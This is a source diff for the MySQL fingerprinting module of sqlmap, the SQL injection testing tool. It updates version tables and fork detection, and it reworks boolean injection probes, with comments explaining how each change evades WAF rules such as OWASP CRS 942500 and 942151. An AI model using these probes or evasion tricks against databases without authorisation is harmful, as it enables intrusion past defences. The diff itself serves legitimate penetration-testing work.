@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
+Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
 See the file 'LICENSE' for copying permission
 """
 
@@ -37,7 +37,7 @@ class Fingerprint(GenericFingerprint):
 
         if not result:
             warnMsg = "unable to perform %s comment injection" % DBMS.MYSQL
-            logger.warn(warnMsg)
+            logger.warning(warnMsg)
 
             return None
 
@@ -45,9 +45,20 @@ class Fingerprint(GenericFingerprint):
         # Reference: https://dev.mysql.com/doc/relnotes/mysql/<major>.<minor>/en/
 
         versions = (
-            (80000, 80029),  # MySQL 8.0
+            (90600, 90601),  # MySQL 9.6
+            (90500, 90501),  # MySQL 9.5
+            (90400, 90401),  # MySQL 9.4
+            (90300, 90301),  # MySQL 9.3
+            (90200, 90201),  # MySQL 9.2
+            (90100, 90101),  # MySQL 9.1
+            (90000, 90002),  # MySQL 9.0
+            (80400, 80409),  # MySQL 8.4
+            (80300, 80301),  # MySQL 8.3
+            (80200, 80201),  # MySQL 8.2
+            (80100, 80101),  # MySQL 8.1
+            (80000, 80043),  # MySQL 8.0
             (60000, 60014),  # MySQL 6.0
-            (50700, 50737),  # MySQL 5.7
+            (50700, 50745),  # MySQL 5.7
             (50600, 50652),  # MySQL 5.6
             (50500, 50563),  # MySQL 5.5
             (50400, 50404),  # MySQL 5.4
@@ -61,7 +72,8 @@ class Fingerprint(GenericFingerprint):
 
         found = False
         for candidate in versions:
-            result = inject.checkBooleanExpression("[RANDNUM]=[RANDNUM]/*!%d AND [RANDNUM1]=[RANDNUM2]*/" % candidate[0])
+            # Note: '.0' keeps the (always false) comparison, but takes the comment off WAF/IPS blacklists (e.g. OWASP CRS rule 942500)
+            result = inject.checkBooleanExpression("[RANDNUM]=[RANDNUM]/*!%d AND [RANDNUM1].0=[RANDNUM2]*/" % candidate[0])
 
             if not result:
                 found = True
@@ -70,7 +82,7 @@ class Fingerprint(GenericFingerprint):
         if found:
             for version in xrange(candidate[1], candidate[0] - 1, -1):
                 version = getUnicode(version)
-                result = inject.checkBooleanExpression("[RANDNUM]=[RANDNUM]/*!%s AND [RANDNUM1]=[RANDNUM2]*/" % version)
+                result = inject.checkBooleanExpression("[RANDNUM]=[RANDNUM]/*!%s AND [RANDNUM1].0=[RANDNUM2]*/" % version)
 
                 if not result:
                     if version[0] == "3":
@@ -84,6 +96,14 @@ class Fingerprint(GenericFingerprint):
 
         return None
 
+    def _checkUtf8mb4(self):
+        # NCHAR (utf8mb3) downgrades 4-byte chars (emoji) to '?'; cache whether utf8mb4 works ('' if not)
+        kb.mysqlUtf8mb4 = hashDBRetrieve(HASHDB_KEYS.MYSQL_UTF8MB4)
+
+        if kb.mysqlUtf8mb4 is None:
+            kb.mysqlUtf8mb4 = "utf8mb4" if inject.checkBooleanExpression("[RANDNUM]=CONVERT([RANDNUM] USING utf8mb4)") else ""
+            hashDBWrite(HASHDB_KEYS.MYSQL_UTF8MB4, kb.mysqlUtf8mb4)
+
     def getFingerprint(self):
         fork = hashDBRetrieve(HASHDB_KEYS.DBMS_FORK)
 
@@ -96,12 +116,20 @@ class Fingerprint(GenericFingerprint):
                 fork = FORK.DRIZZLE
             elif inject.checkBooleanExpression("@@VERSION_COMMENT LIKE '%Percona%'"):
                 fork = FORK.PERCONA
+            elif inject.checkBooleanExpression("@@VERSION_COMMENT LIKE '%Doris%'"):
+                fork = FORK.DORIS
+            elif inject.checkBooleanExpression("@@VERSION_COMMENT LIKE '%StarRocks%'"):
+                fork = FORK.STARROCKS
+            elif inject.checkBooleanExpression("GEOGRAPHY_AREA(NULL) IS NULL"):         # Note: GEOGRAPHY_AREA() is MemSQL specific
+                fork = FORK.MEMSQL
             elif inject.checkBooleanExpression("AURORA_VERSION() LIKE '%'"):            # Reference: https://aws.amazon.com/premiumsupport/knowledge-center/aurora-version-number/
                 fork = FORK.AURORA
             else:
                 fork = ""
 
             hashDBWrite(HASHDB_KEYS.DBMS_FORK, fork)
+
+        self._checkUtf8mb4()
 
         value = ""
         wsOsFp = Format.getOs("web server", kb.headersFp)
@@ -166,9 +194,8 @@ class Fingerprint(GenericFingerprint):
         if not conf.extensiveFp and Backend.isDbmsWithin(MYSQL_ALIASES):
             setDbms("%s %s" % (DBMS.MYSQL, Backend.getVersion()))
 
-            if Backend.isVersionGreaterOrEqualThan("5"):
+            if Backend.isVersionGreaterOrEqualThan("5") or inject.checkBooleanExpression("DATABASE() LIKE SCHEMA()"):
                 kb.data.has_information_schema = True
-
             self.getBanner()
 
             return True
@@ -176,40 +203,41 @@ class Fingerprint(GenericFingerprint):
         infoMsg = "testing %s" % DBMS.MYSQL
         logger.info(infoMsg)
 
-        result = inject.checkBooleanExpression("QUARTER(NULL) IS NULL")
+        # Note: QUARTER() and XOR are the MySQL specifics here, while the dropped IFNULL() only added a name that WAF/IPS blacklist (e.g. OWASP CRS rule 942151)
+        result = inject.checkBooleanExpression("QUARTER(NULL) IS NULL AND (NULL XOR NULL) IS NULL")
 
         if result:
             infoMsg = "confirming %s" % DBMS.MYSQL
             logger.info(infoMsg)
 
-            result = inject.checkBooleanExpression("SESSION_USER() LIKE USER()")
-
-            if not result:
-                # Note: MemSQL doesn't support SESSION_USER()
-                result = inject.checkBooleanExpression("GEOGRAPHY_AREA(NULL) IS NULL")
-
-                if result:
-                    hashDBWrite(HASHDB_KEYS.DBMS_FORK, FORK.MEMSQL)
+            result = inject.checkBooleanExpression("(QUARTER(NULL) XOR [RANDNUM]) IS NULL")
 
             if not result:
                 warnMsg = "the back-end DBMS is not %s" % DBMS.MYSQL
-                logger.warn(warnMsg)
+                logger.warning(warnMsg)
 
                 return False
 
             # reading information_schema on some platforms is causing annoying timeout exits
             # Reference: http://bugs.mysql.com/bug.php?id=15855
 
+            kb.data.has_information_schema = True
+
+            # Determine if it is MySQL >= 9.0.0
+            if inject.checkBooleanExpression("VECTOR_DIM(NULL) IS NULL"):
+                Backend.setVersion(">= 9.0.0")
+                setDbms("%s 9" % DBMS.MYSQL)
+                self.getBanner()
+
             # Determine if it is MySQL >= 8.0.0
-            if inject.checkBooleanExpression("ISNULL(JSON_STORAGE_FREE(NULL))"):
-                kb.data.has_information_schema = True
+            elif inject.checkBooleanExpression("JSON_STORAGE_FREE(NULL) IS NULL"):
                 Backend.setVersion(">= 8.0.0")
                 setDbms("%s 8" % DBMS.MYSQL)
                 self.getBanner()
 
             # Determine if it is MySQL >= 5.0.0
-            elif inject.checkBooleanExpression("ISNULL(TIMESTAMPADD(MINUTE,[RANDNUM],NULL))"):
-                kb.data.has_information_schema = True
+            # Note: '@@automatic_sp_privileges' (MySQL 5.0.3) instead of the blacklisted TIMESTAMPADD()
+            elif inject.checkBooleanExpression("@@automatic_sp_privileges=@@automatic_sp_privileges"):
                 Backend.setVersion(">= 5.0.0")
                 setDbms("%s 5" % DBMS.MYSQL)
                 self.getBanner()
@@ -221,11 +249,11 @@ class Fingerprint(GenericFingerprint):
                 logger.info(infoMsg)
 
                 # Check if it is MySQL >= 5.7
-                if inject.checkBooleanExpression("ISNULL(JSON_QUOTE(NULL))"):
+                if inject.checkBooleanExpression("JSON_QUOTE(NULL) IS NULL"):
                     Backend.setVersion(">= 5.7")
 
                 # Check if it is MySQL >= 5.6
-                elif inject.checkBooleanExpression("ISNULL(VALIDATE_PASSWORD_STRENGTH(NULL))"):
+                elif inject.checkBooleanExpression("VALIDATE_PASSWORD_STRENGTH(NULL) IS NULL"):
                     Backend.setVersion(">= 5.6")
 
                 # Check if it is MySQL >= 5.5
@@ -269,6 +297,8 @@ class Fingerprint(GenericFingerprint):
                 setDbms("%s 4" % DBMS.MYSQL)
                 self.getBanner()
 
+                kb.data.has_information_schema = False
+
                 if not conf.extensiveFp:
                     return True
 
@@ -291,10 +321,12 @@ class Fingerprint(GenericFingerprint):
                 setDbms("%s 3" % DBMS.MYSQL)
                 self.getBanner()
 
+                kb.data.has_information_schema = False
+
             return True
         else:
             warnMsg = "the back-end DBMS is not %s" % DBMS.MYSQL
-            logger.warn(warnMsg)
+            logger.warning(warnMsg)
 
             return False
 
@@ -305,7 +337,7 @@ class Fingerprint(GenericFingerprint):
         infoMsg = "fingerprinting the back-end DBMS operating system"
         logger.info(infoMsg)
 
-        result = inject.checkBooleanExpression("'W'=UPPER(MID(@@version_compile_os,1,1))")
+        result = inject.checkBooleanExpression("'W'=UPPER(LEFT(@@version_compile_os,1))")     # Note: LEFT() instead of the blacklisted MID()
 
         if result:
             Backend.setOs(OS.WINDOWS)
